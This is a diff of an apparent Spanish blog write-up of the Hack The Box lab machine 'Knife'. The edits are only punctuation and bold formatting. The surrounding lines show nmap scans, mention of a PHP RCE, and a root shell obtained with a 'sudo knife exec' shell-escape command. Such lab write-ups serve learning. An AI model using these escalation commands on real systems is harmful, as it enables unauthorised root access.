@@ -8,13 +8,13 @@ image:
   lqip: data:image/webp;base64,UklGRpoAAABXRUJQVlA4WAoAAAAQAAAADwAABwAAQUxQSDIAAAARL0AmbZurmr57yyIiqE8oiG0bejIYEQTgqiDA9vqnsUSI6H+oAERp2HZ65qP/VIAWAFZQOCBCAAAA8AEAnQEqEAAIAAVAfCWkAALp8sF8rgRgAP7o9FDvMCkMde9PK7euH5M1m6VWoDXf2FkP3BqV0ZYbO6NA/VFIAAAA
 ---
 
-**Knife** es una máquina de dificultad `Easy` en la plataforma **Hack The Box**
+**Knife** es una máquina de dificultad `Easy` en la plataforma **Hack The Box**.
 
-En esta máquina explotaremos una **vulnerabilidad** de la versión `8.1.8-dev` de `PHP` mediante un `RCE`
+En esta máquina, explotaremos una **vulnerabilidad** de la versión `8.1.8-dev` de `PHP` mediante un `RCE`.
 
 ## **Reconocimiento**
 
-Realizaremos un escaneo con `nmap` para descubrir puertos abiertos en la máquina víctima
+Realizaremos un escaneo con `nmap` para descubrir puertos abiertos en la máquina víctima:
 
 ```bash
 nmap -p- -sS --min-rate 5000 -vvv -n -Pn 10.10.10.242 -oG allPorts
@@ -22,7 +22,7 @@ nmap -p- -sS --min-rate 5000 -vvv -n -Pn 10.10.10.242 -oG allPorts
 
 ![img](/assets/img/post/knife/d39b61c6-b6af-410d-ac30-6014585c55d5.png)
 
-Vemos que están abiertos el puerto `22` y el `80`
+Vemos que están abiertos el puerto `22` y el `80`.
 
 Vamos a realizar un escaneo de **servicios** y **versiones** sobre estos puertos:
 
@@ -32,7 +32,7 @@ nmap -sCV -p22,80 10.10.10.242 -oN versions
 
 ![img](/assets/img/post/knife/ba998012-681a-4d58-9014-5f242f7f0ec6.png)
 
-Podemos ver que por el puerto `22` corre un servicio `SSH` y por el `80` un `HTTP`
+Podemos ver que por el puerto `22` corre un servicio `SSH` y por el `80` un `HTTP`.
 
 Con `curl` haremos una petición en la web a ver que nos devuelve:
 
@@ -98,7 +98,7 @@ james@knife:/$ /usr/bin/knife -h
 knife exec [SCRIPT] (options)
 ```
 
-Usaremos esto para conseguir una consola como root, para ello ejecutaremos el siguiente comando:
+Usaremos esto para conseguir una consola como **root**, para ello ejecutaremos el siguiente comando:
 
 ```bash
 james@knife:/$ sudo knife exec -E 'exec "/bin/sh"'
@@ -106,6 +106,6 @@ james@knife:/$ sudo knife exec -E 'exec "/bin/sh"'
 uid=0(root) gid=0(root) groups=0(root)
 ```
 
-Y ya tendremos acceso como root a la máquina
+Y ya tendremos **acceso como root** a la máquina víctima.
 
 *Espero que os haya gustado y servido, cualquier comentario es de mucha ayuda. Adios!*
